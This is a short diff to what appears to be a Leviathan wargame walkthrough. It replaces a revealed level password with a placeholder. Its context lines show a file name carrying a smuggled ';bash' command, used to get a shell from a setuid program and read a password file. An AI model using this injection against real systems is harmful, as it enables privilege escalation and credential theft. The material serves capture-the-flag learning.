@@ -90,6 +90,6 @@ leviathan2@leviathan:~$ touch "/tmp/bash_logout;bash"
 leviathan2@leviathan:~$ ./printfile $_
 /bin/cat: /tmp/bash_logout: No such file or directory
 leviathan3@leviathan:~$ cat /etc/leviathan_pass/leviathan3
-Ahdiemoo1j
+leviathan3_password
 ```
 
